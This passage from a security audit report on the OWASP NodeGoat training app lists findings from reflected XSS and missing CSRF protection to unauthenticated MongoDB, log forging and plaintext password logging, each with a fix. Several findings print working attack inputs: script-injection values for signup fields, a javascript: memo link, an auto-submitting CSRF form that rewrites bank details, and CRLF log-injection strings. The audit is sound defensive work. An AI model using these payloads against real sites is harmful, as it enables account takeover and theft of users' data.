                                    <label for="firstName">First Name</label>
                                    <input type="text" class="form-control" id="firstName" value="{{firstName}}" name="firstName" placeholder="Enter first name">
                                </div>

                                <div class="form-group">
                                    <label for="lastName">Last Name</label>
                                    <input type="text" class="form-control" id="lastName" value="{{lastName}}" name="lastName" placeholder="Enter last name">
                                </div>

                                <div class="form-group">
                                    <label for="lastname">Password</label>
                                    <input type="password" class="form-control" id="password" name="password" value="{{password}}" placeholder="Enter password">
                                </div>

                                <div class="form-group">
                                    <label for="verify">Verify Password</label>
                                    <input type="password" class="form-control" id="verify" name="verify" value="{{verify}}" placeholder="Enter password">
                                </div>

                                <div class="form-group">
                                    <label for="verify">Email (Optional)</label>
                                    <input type="email" class="form-control" id="email" name="email" value="{{email}}" placeholder="Enter email">
```

**Impact**

- **Attacker:** needs the victim to submit a crafted signup form (e.g. a duplicate user name plus a payload).
- **Gain:** reflected script execution in the victim's browser on the app origin - same class as the login reflection, second sink.

**How to trigger it**

`POST /signup` with `userName`=`"><script>alert(1)</script>`&amp;`firstName=A&lastName=B&password=p&verify=p`&amp;email=`"><script>alert(2)</script>` - validation passes for the email but the response HTML contains both unescaped script fragments in the input values.

**How to fix it**

- Enable autoescape at `server.js:135-142` (and add `| safe` to the trusted `{{ marked(...) }}` and `{{script}}` sinks as noted for the other findings), or explicitly escape the echoed values.
- Do not re-render raw request values into attributes.

Suggested code for `app/views/signup.html`:

```html
// app/views/signup.html
<input type="text" class="form-control" id="userName" value="{{ userName|e }}" name="userName" placeholder="Enter user name">
<input type="email" class="form-control" id="email" name="email" value="{{ email|e }}" placeholder="Enter email">
```

<details>
<summary>How it was verified</summary>

- Reachable and attacker-controlled.
- `handleSignup` builds errors = `{"userName": userName, "email": email}` from `req.body` (`app/routes/session.js:191-204`) and renders it back on both the validation-failure branch (`session.js:248-252`) and the duplicate-user branch (`session.js:212-218`).
- `signup.html:75` and `:102` print those values inside value="..." attributes with autoescape off (`server.js:135-142`).
- Concrete trigger that works despite the 20-char `USER_RE` (`session.js:140`): `POST /signup` with `userName`="&gt;`<script>``alert(1)``</script>`; it fails `USER_RE`, so the else branch at `session.js:248` renders the page with the raw `userName`; the response contains value=""&gt;`<script>``alert(1)``</script>`" and the script runs. email at `:102` is likewise raw (must pass `EMAIL_RE`, e.g. "&gt;`<script>``alert(2)``</script>`@a.b).
- The claim's exact email payload (no @) only works on the duplicate/validation-failure path where validation is not required for the echoed attribute; either way the sink is real.
- Severity raised low-&gt;medium (reflected XSS).

</details>

</details>

<details>
<summary><b>YKB-021</b> · 🟡 Medium · MongoDB runs without authentication and the app connects with no credentials</summary>

**Location:** [`docker-compose.yml:5-17`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/docker-compose.yml#L5-L17) · **Category:** misconfiguration · **Status:** Confirmed

**What is wrong**

- `docker-compose.yml` starts MongoDB with `image: mongo:4.4` and no credentials (`docker-compose.yml:13-17`), so mongod runs with authorisation disabled, and the app connects with an unauthenticated URI (`docker-compose.yml:8`, `config/env/all.js:3`).
- The default `MONGODB_URI` in `config/env/all.js:3` is also `mongodb://localhost:27017/nodegoat` with no user/password.

```yaml
    build: .
    environment:
      NODE_ENV:
      MONGODB_URI: mongodb://mongo:27017/nodegoat
    command: sh -c "until nc -z -w 2 mongo 27017 && echo 'mongo is ready for connections' && node artifacts/db-reset.js && npm start; do sleep 2; done"
    ports:
      - "4000:4000"

  mongo:
    image: mongo:4.4
    user: mongodb
    expose:
      - 27017
```

**Impact**

- **Attacker:** anyone who can reach the mongo port - another container on the same Docker network, a host on the LAN if the port is ever published (the README's `npm run docker-mongo` does publish 27017), or the app itself via the SSRF/injection flaws.
- **Gain:** full read/write of the users collection including SSNs, bank accounts and plaintext passwords, with no authentication at all.

**How to trigger it**

With docker-compose up, `mongo --host 127.0.0.1 --port 27017` (or `npm run docker-mongo`, which publishes 27017) connects without credentials and `db.users.find()` returns every user document.

**How to fix it**

Turn on auth for the mongo service (`--auth`, or `MONGO_INITDB_ROOT_USERNAME`/PASSWORD) and put credentials in `MONGODB_URI` (`docker-compose.yml:8`); bind the published port to loopback (`"127.0.0.1:27017:27017"` in `package.json:36`) instead of all interfaces.

Suggested code for `docker-compose.yml`:

```yaml
services:
  mongo:
    image: mongo:4.4
    environment:
      MONGO_INITDB_ROOT_USERNAME: nodegoat
      MONGO_INITDB_ROOT_PASSWORD_FILE: /run/secrets/mongo_password
    expose:
      - 27017
```

<details>
<summary>How it was verified</summary>

- Facts check out: `docker-compose.yml:13-17` runs `mongo:4.4` with no credentials and no --auth, so mongod runs with authorisation disabled, and the web service (`docker-compose.yml:8`) and default URI (`config/env/all.js:3`) connect unauthenticated.
- The data is genuinely sensitive: `app/data/user-dao.js:25` stores the password as received and `app/data/user-dao.js:64-65` compares it as a plain string, and `artifacts/db-reset.js:18`,27,35 seed `Admin_123`/`User1_123`/`User2_123` in clear text, alongside ssn/`bankAcc`/`bankRouting` written by `app/data/profile-dao.js:42-60`.
- Reachability is why I raise it from low to medium: in compose the port is only `expose`d (`docker-compose.yml:16-17`), so the anonymous path is either a co-tenant container or the documented `npm run docker-mongo` (`package.json:36`), which publishes 27017 on 0.0.0.0.
- Given that path, an anonymous attacker dumps every user's credentials, SSN and bank details.
- Needs the published port/shared network, hence medium not high.

</details>

</details>

<details>
<summary><b>YKB-022</b> · 🟡 Medium · Outdated, vulnerable dependency versions (marked 0.3.5, needle 2.2.4, swig 1.4.2, mongodb 2.x) are pinned</summary>

**Location:** [`package.json:6-24`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/package.json#L6-L24) · **Category:** dependency · **Status:** Confirmed

**What is wrong**

`package.json` pins libraries with known problems, and the app is an OWASP teaching target for exactly this:

- marked 0.3.5 (`package.json:17`): multiple published XSS/sanitize-bypass and ReDoS advisories affect versions before 0.3.9/4.x, and this app relies on its `sanitize` flag as the only HTML filter for memos (`server.js:126-128`, `app/views/memos.html:31`).
- needle 2.2.4 (`package.json:19`): no timeout/redirect control used, and it is the client behind the SSRF at `research.js:16`.
- swig 1.4.2 (`package.json:22`): unmaintained templating engine, last release 2015, used with autoescaping disabled.
- mongodb ^2.1.18 (`package.json:18`): the legacy 2.x driver, long EOL/out of support.
- express 4.13/4.14-era and express-session 1.13 (`package.json:13-14`).

```json
  "main": "server.js",
  "dependencies": {
    "bcrypt-nodejs": "0.0.3",
    "body-parser": "^1.15.1",
    "consolidate": "^0.14.1",
    "csurf": "^1.8.3",
    "dont-sniff-mimetype": "^1.0.0",
    "express": "^4.13.4",
    "express-session": "^1.13.0",
    "forever": "^2.0.0",
    "helmet": "^2.0.0",
    "marked": "0.3.5",
    "mongodb": "^2.1.18",
    "needle": "2.2.4",
    "node-esapi": "0.0.1",
    "serve-favicon": "^2.3.0",
    "swig": "^1.4.2",
    "underscore": "^1.8.3"
  },
```

**Impact**

- **Attacker:** depends on the advisory - stored XSS via crafted memos, request smuggling/DoS through the HTTP stack, or ReDoS.
- **Gain:** script execution in other users' browsers or a hung process, without touching application logic.

**How to trigger it**

`grep -A3 marked package.json` shows the exact 0.3.5 pin; posting a memo containing known marked-0.3.x sanitiser bypass payloads (e.g. `<a href="javascript:alert(1)">x</a>` inside Markdown) lets script run on `/memos` despite `sanitize:true`.

**How to fix it**

- Upgrade marked to a maintained major AND stop relying on its sanitize flag: render with autoescape on (`server.js:135-142`) and pass the HTML through a maintained sanitiser (sanitize-html or DOMPurify) before emitting it at `app/views/memos.html:31`.
- Also move off `node:12` (`Dockerfile:1`) and swig 1.4.2, bump needle to &gt;=3 and mongodb driver to 4.x/6.x, and run `grunt retire`/`npm audit` in CI (already wired at `Gruntfile.js:130-139`,151).

<details>
<summary>How it was verified</summary>

- Pins verified: `package.json:17` marked 0.3.5 (exact), `:18` mongodb ^2.1.18, `:19` needle 2.2.4, `:22` swig ^1.4.2, `:13-14` express ^4.13.4 / express-session ^1.13.0; `package-lock.json:20713-20715` confirms marked 0.3.5 resolves.
- The concrete consequence is stored XSS via memos, fully in-repo: any logged-in user POSTs to `/memos` (`app/routes/index.js:68-69` -&gt; `app/routes/memos.js:11-17`, no validation), the memo renders as `{{ marked(doc.memo) }}` at `app/views/memos.html:31`, marked's own sanitize is the only filter (`server.js:126-129`) and swig autoescape is off (`server.js:135-142`), and every user sees the page. marked 0.3.x sanitize does not vet link/image URL schemes, so something like `[x](javascript:alert(document.cookie))` survives `sanitize:true` as `<a href="javascript:...">`.
- Caveat: `node_modules` is not in this export, so I could not execute marked 0.3.5 to pin the exact payload; version, data flow, sanitize-as-only-filter and autoescape are confirmed from the code.
- The ReDoS/smuggling angles are not demonstrated; the XSS alone justifies medium.

</details>

</details>

<details>
<summary><b>YKB-023</b> · 🟡 Medium · Session cookie has no Secure, <code>SameSite</code> or expiry settings and is sent over plain HTTP</summary>

**Location:** [`server.js:78-102`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/server.js#L78-L102) · **Category:** session · **Status:** Confirmed

**What is wrong**

- The express-session configuration (`server.js:78-102`) sets only `secret`, `saveUninitialized: true` and `resave: true`; the entire cookie-options block is commented out (`server.js:92-100`).
- So the session cookie is sent with no `Secure` flag, no `SameSite`, no `Max-Age`/idle timeout (it lives until the browser closes), keeps the default name `connect.sid`, and a session is created for every anonymous hit.
- The app is only reachable over plain HTTP (`server.js:144-147`), so the cookie also travels in clear text.

```js
    app.use(session({
        // genid: (req) => {
        //    return genuuid() // use UUIDs for session IDs
        //},
        secret: cookieSecret,
        // Both mandatory in Express v4
        saveUninitialized: true,
        resave: true
        /*
        // Fix for A5 - Security MisConfig
        // Use generic cookie name
        key: "sessionId",
        */

        /*
        // Fix for A3 - XSS
        // TODO: Add "maxAge"
        cookie: {
            httpOnly: true
            // Remember to start an HTTPS server to get this working
            // secure: true
        }
        */

    }));
```

**Impact**

- **Attacker:** anyone on the network path (open Wi-Fi, proxy) or any other site.
- **Gain:** passive capture of the session cookie yields full account takeover (and the cookie stays valid indefinitely); the missing `SameSite` is what makes the CSRF findings practical; `saveUninitialized` lets an anonymous client create unlimited server-side sessions.

**How to trigger it**

Any request to `/login` shows `Set-Cookie: connect.sid=s%3A...; Path=/` with no Secure/`SameSite`/`Max-Age` attributes, and the cookie is re-sent over http:// even though credentials and SSN/bank data are POSTed alongside it.

**How to fix it**

As reported: uncomment the cookie block and add `sameSite`/`maxAge`, e.g. `cookie: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 30*60*1000 }`, set `saveUninitialized: false`, `resave: false`, a custom name, and enable the TLS server at `server.js:149-155`.

Suggested code for `server.js`:

```js
app.use(session({
    name: "sid",
    secret: cookieSecret,
    saveUninitialized: false,
    resave: false,
    cookie: { httpOnly: true, secure: true, sameSite: "lax", maxAge: 30 * 60 * 1000 }
}));
```

<details>
<summary>How it was verified</summary>

- `server.js:78-102` sets only secret/`saveUninitialized`/resave; the whole cookie-options block is commented out, so no Secure, no `SameSite`, no `maxAge` and the default name `connect.sid` is used, and the app listens on plain http (`server.js:144-147`).
- **One nuance:** express-session's defaults do set `httpOnly:true`, so the cookie is not readable by JS; the exposure is network capture and the missing `SameSite`/Secure/expiry, all confirmed.
- Severity medium is fair (network-position attacker -&gt; account takeover).
- Note for the CSRF companion finding: modern browsers apply `SameSite=Lax` by default when the attribute is absent, which mitigates cross-site form POSTs, so the CSRF impact depends on the browser.

</details>

</details>

<details>
<summary><b>YKB-024</b> · 🟡 Medium · No CSRF protection on any state-changing POST route</summary>

**Location:** [`server.js:104-113`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/server.js#L104-L113) · **Category:** csrf · **Status:** Confirmed

**What is wrong**

- csurf is imported but never mounted: the middleware block is commented out at `server.js:104-113`, and no other code checks a token.
- The hidden `_csrf` inputs in the templates (`login.html:117`, `signup.html:104`, `profile.html:73`) are therefore never populated (csrftoken is undefined) and never validated.
- In addition, the session cookie is set without `SameSite` (`server.js:78-102`, cookie options commented at `:92-100`), and logout is a state-changing GET (`index.js:41` -&gt; `session.js:121-123`).

```js
    /*
    // Fix for A8 - CSRF
    // Enable Express csrf protection
    app.use(csrf());
    // Make csrf token available in templates
    app.use((req, res, next) => {
        res.locals.csrftoken = req.csrfToken();
        next();
    });
    */
```

**Impact**

- **Attacker:** a third-party site the victim visits while logged in.
- **Gain:** perform state changes as the victim - `POST /profile` to overwrite SSN/bank account/routing number, `POST /contributions` to change payroll percentages, `POST /benefits` to change benefits dates, `POST /memos` to plant content, `POST /signup` to create accounts; plus forced logout via `<img src="http://host:4000/logout">`.

**How to trigger it**

- With a logged-in victim, serve them a page containing `<form id=f method=POST action="http://localhost:4000/profile">``<input name=firstName value=owned>``<input name=bankAcc value=12345678>``<input name=bankRouting value=0198212#>``</form>``<script>``f.submit()``</script>` - the victim's profile is overwritten with no token check.
- Same for `/contributions` with `preTax`/`afterTax`/roth.

**How to fix it**

As reported: mount csurf (or equivalent) before the routes in `server.js` and add valid \_csrf fields to every POST form including `contributions.html`; additionally set `cookie.sameSite`: 'lax' in `server.js:92-100` and change logout to POST.

Suggested code for `server.js`:

```js
app.use(csrf());
app.use((req, res, next) => {
    res.locals.csrftoken = req.csrfToken();
    next();
});

// and add to every state-changing form (contributions.html currently has it commented out):
<input type="hidden" name="_csrf" value="{{csrftoken}}">

// cookie:
cookie: { httpOnly: true, sameSite: "lax", secure: true }
```

<details>
<summary>How it was verified</summary>

- Verified: csrf is required but commented out (`server.js:7`) and the `app.use(csrf())` block is entirely commented (`server.js:104-113`); grep shows no other token validation anywhere in app/ or `server.js`.
- The hidden \_csrf inputs in `login.html:117`, `signup.html:104`, `profile.html:73` and `contributions.html:91` render `{{csrftoken}}` which is never set, so tokens are empty and unchecked.
- State-changing routes `POST /profile`, `/contributions`, `/benefits`, `/memos`, `/signup` (`app/routes/index.js:37-65`) are only guarded by `isLoggedIn`, and logout is a GET (`index.js:41` -&gt; `session.js` `displayLogoutPage` calling `req.session.destroy`).
- Cookie has no `SameSite` attribute (`server.js:78-102`).
- A cross-site auto-submitting POST form to `/profile` indeed overwrites `firstName`/`bankAcc`/`bankRouting` with the victim's session.
- Medium is correct; note modern browsers' default `SameSite=Lax` blunts the cross-site POST vector, but the app itself sets no defence.

</details>

</details>

<details>
<summary><b>YKB-025</b> · 🔵 Low · Every deploy runs a database reset that drops all collections</summary>

**Location:** [`app.json:9-10`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app.json#L9-L10) · **Category:** logic · **Status:** Confirmed

**What is wrong**

- `app.json` registers `postdeploy: node artifacts/db-reset.js`, which drops the users, allocations, contributions, memos and counters collections and re-inserts the three demo users, with the default admin/`Admin_123` and user1/`User1_123` credentials.
- Every Heroku deploy therefore wipes all real data and re-enables publicly known accounts.
- It runs automatically with no confirmation or environment guard.

```json
  "website": "https://www.owasp.org/index.php/Projects/OWASP_Node_js_Goat_Project",
  "logo": "https://www.owasp.org/skins/owasplogo.png",
```

**How to trigger it**

`app.json:9-11` `"postdeploy": "node artifacts/db-reset.js"`; the script's `tryDropCollection` loop (`artifacts/db-reset.js:71-84`) drops every collection and inserts `USERS_TO_INSERT` with `admin`/`Admin_123` (`artifacts/db-reset.js:12-37`).

**How to fix it**

- Seed only when the users collection is empty, or keep the reset as a manual command (`package.json` already has `db:seed` at `package.json:34`) and require a non-default admin password from the environment on seed.
- Also document that review apps must not share the production `MONGODB_URI`.

Suggested code for `app.json`:

```json
"scripts": {
  "postdeploy": "node artifacts/db-seed-if-empty.js"
}
```

<details>
<summary>How it was verified</summary>

- `app.json:12-14` registers `postdeploy: node artifacts/db-reset.js`; `artifacts/db-reset.js:71-84` drops users, allocations, contributions, memos and counters and re-inserts `USERS_TO_INSERT` with plaintext admin/`Admin_123` (`db-reset.js:12-37`), with no environment guard.
- One correction to the claim: Heroku runs `app.json` `postdeploy` only when creating review apps, not on every production deploy, so the blast radius is any review app (or any pipeline step that runs db-reset) against the `MONGODB_URI` in `app.json:16-20`, not literally every deploy.
- The data-wipe/default-credentials risk stands, so severity stays low.

</details>

</details>

<details>
<summary><b>YKB-026</b> · 🔵 Low · Vendored front-end libraries (jQuery 1.10.2, Bootstrap 3.0.0) have published XSS and prototype-pollution advisories</summary>

**Location:** [`app/assets/vendor/jquery.min.js:1`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/assets/vendor/jquery.min.js#L1) · **Category:** dependency · **Status:** Confirmed

**What is wrong**

The browser bundles are ancient and served to every page (`server.js:121`, `layout.html:111-122`): jQuery 1.10.2 (`app/assets/vendor/jquery.min.js:1`), Bootstrap 3.0.0 (`app/assets/vendor/bootstrap/bootstrap.js:2`), bootstrap-tour 0.8.0 and Morris 0.4.3.

jQuery &lt;3.4 is affected by CVE-2019-11358 (prototype pollution via \$.extend), and &lt;3.5 by CVE-2020-11022/CVE-2020-11023 (XSS in `htmlPrefilter` when passing attacker-controlled HTML to .`html()`/.`append()`); Bootstrap &lt;3.4.1 is affected by CVE-2019-8331 (XSS in tooltip/popover data-\* attributes) and CVE-2018-14042.

```js
/*! jQuery v1.10.2 | (c) 2005, 2013 jQuery Foundation, Inc. | jquery.org/license
```

**Impact**

- **Attacker:** a user who can get markup into the page (which this app makes trivial - memos, profile names) or who operates the app's own DOM sinks.
- **Gain:** escalation of an HTML-injection into script execution through the library, and prototype pollution that can reach client logic.

**How to trigger it**

`head -1 app/assets/vendor/jquery.min.js` shows `jQuery v1.10.2`; `head -2 app/assets/vendor/bootstrap/bootstrap.js` shows `Bootstrap v3.0.0`. Both are loaded on every authenticated page through `layout.html:111-112`.

**How to fix it**

Replace the vendored files with jQuery 3.7.x and Bootstrap 3.4.1 (or 5.x) and verify the app's DOM code against the newer APIs; extend the `retire.js` grunt task to scan `js` assets too (`Gruntfile.js:130-139` currently checks only `node: ["./"]`).

Suggested code for `app/assets/vendor/jquery.min.js`:

```js
<!-- layout.html -->
<script src="/vendor/jquery-3.7.1.min.js"></script>
<script src="/vendor/bootstrap-3.4.1/bootstrap.js"></script>
```

<details>
<summary>How it was verified</summary>

- Verified the vendored copies: `app/assets/vendor/jquery.min.js:1` is jQuery v1.10.2 and `app/assets/vendor/bootstrap/bootstrap.js:2` is Bootstrap v3.0.0, both served via `express.static` (`server.js:121`) and loaded on every authenticated page (`app/views/layout.html:111-113`,117). jQuery 1.10.2 falls in the affected ranges of CVE-2019-11358, CVE-2020-11022 and CVE-2020-11023; Bootstrap 3.0.0 in those of CVE-2019-8331 and CVE-2018-14042.
- Exploitation depends on attacker HTML reaching those DOM sinks, so this is defence-in-depth rather than a directly triggerable flaw; low is correct.

</details>

</details>

<details>
<summary><b>YKB-027</b> · 🔵 Low · Internal error messages are rendered to the client on the 500 page</summary>

**Location:** [`app/routes/error.js:3-13`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/error.js#L3-L13) · **Category:** sensitive-data · **Status:** Confirmed

**What is wrong**

- The terminal error middleware logs `err.message` and `err.stack` (`error.js:7-8`) and then renders the raw error object into `app/views/error-template.html:11`, where `{{error}}` is emitted with autoescaping off (`server.js:135-142`).
- Whatever internal detail is in the error reaches the client, e.g. MongoDB driver errors and messages built from internal state (`"User: " + user + " does not exist"` in `user-dao.js:84`, `"ERROR: No allocations found for the user"` in `allocations-dao.js:88`).

```js
const errorHandler = (err, req, res,next) => {

    "use strict";

    console.error(err.message);
    console.error(err.stack);
    res.status(500);
    res.render("error-template", {
        error: err
    });
};
```

**Impact**

- **Attacker:** a visitor who can trigger an error (invalid ids, malformed query parameters such as a broken `$where`, DB failures).
- **Gain:** internal implementation details - database type/version, query shapes, object dumps - which shorten the path to the injection and SSRF flaws.
- Because the value is unescaped, any error message echoing request data is also a reflected XSS vector.

**How to trigger it**

As a logged-in user, `GET /allocations/abc` shows the internal message on the 500 page; `GET /allocations/999999` returns `ERROR: No allocations found for the user`.

**How to fix it**

Log the error and render a generic body with a correlation id; keep autoescape on for this template. If you also want the XSS angle closed, never interpolate err into HTML:

```js
const errorHandler = (err, req, res, next) => {
    console.error(err.stack || err);
    res.status(500).render("error-template", { message: "Internal server error" });
};
```

and in `error-template.html` use `<br>``{{ message }}` with autoescape enabled for that template.

Suggested code for `app/routes/error.js`:

```js
res.status(500);
res.render("error-template", { error: "An internal error occurred" });
```

<details>
<summary>How it was verified</summary>

- Reachable: any next(err) path lands in `error.js:3-12`, e.g. `GET /allocations/abc` -&gt; `parseInt("abc")`=NaN -&gt; find({`userId`: NaN}) returns no docs -&gt; callback("ERROR: No allocations found for the user") (`app/data/allocations-dao.js:86-88`) -&gt; next(err) at `allocations.js:24`.
- `memos-dao.js:32` similarly.
- The template emits `{{error}}` (`app/views/error-template.html:11`) with swig autoescape off (`server.js:135-142`), so the raw message reaches the caller.
- Minor correction: swig stringifies the Error, so what leaks is `err.message` ("ERROR: No allocations found for the user", "Error: `<driver message>`"), not a stack or object dump; the stack only goes to console (`error.js:8`).
- Internal-message disclosure, no direct impact =&gt; low.
- The reflected-XSS variant is possible but not demonstrated: the only live throw that embeds request data is commented out (`allocations-dao.js:75`), and the `$where` error text from the driver is not guaranteed to echo the threshold.

</details>

</details>

<details>
<summary><b>YKB-028</b> · 🔵 Low · Failed-login log line includes unsanitised user name, allowing log forging</summary>

**Location:** [`app/routes/session.js:62-65`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/session.js#L62-L65) · **Category:** injection · **Status:** Confirmed

**What is wrong**

- On a failed login the handler logs the raw user name: `console.log("Error: attempt to login with invalid user: ", userName)` (`session.js:64`).
- The value goes straight from `req.body` with no CR/LF filtering (the ESAPI/CRLF handling is only present as a comment at `session.js:66-80`).

```js
            if (err) {
                if (err.noSuchUser) {
                    console.log("Error: attempt to login with invalid user: ", userName);
```

**Impact**

- **Attacker:** an anonymous visitor.
- **Gain:** forged log lines - sending `userName`=`admin\nError: attempt to login with invalid user: root` injects extra lines, which can poison log-based alerting/parsing, hide the attacker's own failed attempts among fake ones, or (in terminal/tail contexts) inject escape sequences.

**How to trigger it**

`POST /login` with `userName=admin%0A2030-01-01%20INFO%20login%20success&password=x` - the server log gains an extra, attacker-chosen line whenever the login fails.

**How to fix it**

Strip CR/LF and bound the length before logging, or use a structured logger. Keep the rest of the handler unchanged.

Suggested code for `app/routes/session.js`:

```js
console.log("Error: attempt to login with invalid user: ", String(userName).replace(/[\r\n]/g, "_").slice(0, 100));
```

<details>
<summary>How it was verified</summary>

- Anonymous `POST /login` with an unknown `userName` reaches `app/routes/session.js:64`, which passes the raw body value to `console.log` as a separate argument; embedded CR/LF are written verbatim (%0A is decoded by body-parser's urlencoded parser).
- The CRLF handling is only commented out (`session.js:66-80`).
- Impact is log forging only - low is right.

</details>

</details>

<details>
<summary><b>YKB-029</b> · 🔵 Low · Password policy accepts single-character passwords despite the stated rules</summary>

**Location:** [`app/routes/session.js:138-149`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/session.js#L138-L149) · **Category:** authentication · **Status:** Confirmed

**What is wrong**

- `validateSignup` allows any password because `PASS_RE` is `/^.{1,20}$/` (`session.js:144`) and the error text still claims "8 to 18 characters including numbers, lowercase and uppercase letters" (`session.js:172-174`).
- A one-character password is accepted, and the seeded users carry short human-chosen passwords (`artifacts/db-reset.js:18`,27,35).

```js
    const validateSignup = (userName, firstName, lastName, password, verify, email, errors) => {

        const USER_RE = /^.{1,20}$/;
        const FNAME_RE = /^.{1,100}$/;
        const LNAME_RE = /^.{1,100}$/;
        const EMAIL_RE = /^[\S]+@[\S]+\.[\S]+$/;
        const PASS_RE = /^.{1,20}$/;
        /*
        //Fix for A2-2 - Broken Authentication -  requires stronger password
        //(at least 8 characters with numbers and both lowercase and uppercase letters.)
        const PASS_RE =/^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$/;
        */
```

**Impact**

- **Attacker:** an anonymous visitor trying credentials (combined with the missing throttling and plain-text storage).
- **Gain:** guessing trivially weak passwords is far easier and the seeded admin password is predictable.

**How to trigger it**

`POST /signup` with `userName=newguy&firstName=A&lastName=B&password=a&verify=a`&amp;email= - signup succeeds and logs the new account in, so a one-character password is now valid.

**How to fix it**

Enforce a real minimum length/complexity and keep the message in sync. A length floor of 12 is better than the commented 8-char pattern; also apply it to existing accounts.

Suggested code for `app/routes/session.js`:

```js
const PASS_RE = /^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,72}$/;
// message: "Password must be at least 8 characters and include numbers, lowercase and uppercase letters."
```

<details>
<summary>How it was verified</summary>

- `app/routes/session.js:144` sets `PASS_RE` = /^.{1,20}\$/ (the strict pattern is commented at 145-149), so `POST /signup` accepts a 1-character password while the error text at `session.js:172-173` claims 8-18 chars with mixed case and digits.
- Seeded users have short human passwords (`artifacts/db-reset.js:18`, 27, 35).
- Reachable anonymously at `POST /signup` (`app/routes/index.js:38`).
- Missing password policy - low is right.

</details>

</details>

<details>
<summary><b>YKB-030</b> · 🔵 Low · Signup checks for an existing user name and then inserts without a unique index, so the name can be taken twice</summary>

**Location:** [`app/routes/session.js:206-245`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/session.js#L206-L245) · **Category:** race · **Status:** Confirmed

**What is wrong**

- `handleSignup` first checks for an existing user with `getUserByUserName` (`session.js:208-218`) and only then inserts with `addUser` (`session.js:220-245`).
- The users collection has no unique index on `userName` (`artifacts/db-reset.js:85-101` inserts without creating one) and the id comes from a shared counter (`user-dao.js:38-46`), so two concurrent signups for the same name both pass the check and both insert.

```js
        if (validateSignup(userName, firstName, lastName, password, verify, email, errors)) {

            userDAO.getUserByUserName(userName, (err, user) => {

                if (err) return next(err);

                if (user) {
                    errors.userNameError = "User name already in use. Please choose another";
                    return res.render("signup", {
                        ...errors,
                        environmentalScripts
                    });
                }

                userDAO.addUser(userName, firstName, lastName, password, email, (err, user) => {

                    if (err) return next(err);

                    //prepare data for the user
                    prepareUserData(user, next);
                    /*
                    sessionDAO.startSession(user._id, (err, sessionId) => {
                        if (err) return next(err);
                        res.cookie("session", sessionId);
                        req.session.userId = user._id;
                        return res.render("dashboard", { ...user, environmentalScripts });
                    });
                    */
                    req.session.regenerate(() => {
                        req.session.userId = user._id;
                        // Set userId property. Required for left nav menu links
                        user.userId = user._id;

                        return res.render("dashboard", {
                            ...user,
                            environmentalScripts
                        });
                    });

                });
```

**Impact**

- **Attacker:** an anonymous visitor racing the victim's signup (or its own).
- **Gain:** duplicate account names - login then resolves `findOne({userName})` (`user-dao.js:91-93`) to whichever document Mongo returns first, so the attacker can end up authenticating as, or shadowing, the legitimate account with that name, and can pre-register a name an admin is about to create.

**How to trigger it**

- Fire two simultaneous `POST /signup` requests with the same `userName` (different passwords) - both succeed and the users collection contains two documents with that `userName`.
- Afterwards `POST /login` with the second password logs into an account with the same name as the first.

**How to fix it**

Make the database enforce uniqueness and surface the error: create a unique index on `users.userName` at seed/migration time and translate the duplicate-key error from `addUser` into the "user name already in use" message instead of relying on the check-then-insert read.

Suggested code for `app/routes/session.js`:

```js
// artifacts/db-reset.js, before insertMany:
usersCol.createIndex({ userName: 1 }, { unique: true }, (err) => { /* ... */ });
```

<details>
<summary>How it was verified</summary>

- TOCTOU is real: `handleSignup` does `getUserByUserName` (`app/routes/session.js:208-218`) and only then `addUser` (`session.js:220`), and nothing creates a unique index on `users.userName` - `artifacts/db-reset.js:71-101` only drops/inserts collections, and grep for `createIndex` across app/, artifacts/ and `server.js` finds none.
- Two concurrent `POST /signup` with the same `userName` both pass the check and both insert, and login resolves via `findOne({userName})` (`app/data/user-dao.js:91-93`) so the identity is whichever document Mongo returns first.
- Anonymous (`app/routes/index.js:38`).
- Severity low is right, but the stated gain is overstated: the attacker cannot log in as the other document, since the password is compared against the returned document (`user-dao.js:74-81`); the impact is duplicate/shadowed account names and ambiguity, not account takeover.

</details>

</details>

<details>
<summary><b>YKB-031</b> · 🔵 Low · Database reset prints every user's plaintext password to the deploy log</summary>

**Location:** [`artifacts/db-reset.js:98-99`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/artifacts/db-reset.js#L98-L99) · **Category:** sensitive-data · **Status:** Confirmed

**What is wrong**

The db-reset script logs every user document it is about to insert, including the plaintext password, so the seeded credentials of admin/user1/user2 are written to stdout on every deploy (Heroku postdeploy, docker-compose startup, grunt db-reset - all route stdout to persistent logs).

```js
        console.log("Users to insert:");
        USERS_TO_INSERT.forEach((user) => console.log(JSON.stringify(user)));
```

**How to trigger it**

`npm run db:seed` prints `{"_id":1,"userName":"admin",...,"password":"Admin_123","isAdmin":true}` because of `USERS_TO_INSERT.forEach((user) => console.log(JSON.stringify(user)));`.

**How to fix it**

Log only non-secret fields, or omit the password before printing at `artifacts/db-reset.js:98-99`.

Suggested code for `artifacts/db-reset.js`:

```js
console.log("Users to insert:");
USERS_TO_INSERT.forEach(({ _id, userName, isAdmin }) =>
    console.log(JSON.stringify({ _id, userName, isAdmin })));
```

<details>
<summary>How it was verified</summary>

- Literal code path: `db-reset.js:98-99` prints "Users to insert:" then `JSON.stringify` of every user document, which at `:18`/:27/:35 includes the plaintext password.
- It runs on every deploy: `docker-compose.yml:9` runs `node artifacts/db-reset.js` at container start, `app.json:12-14` wires it as the Heroku postdeploy step, and `Gruntfile.js:158-169` backs `grunt db-reset` (which `npm run db:seed` invokes, `package.json`).
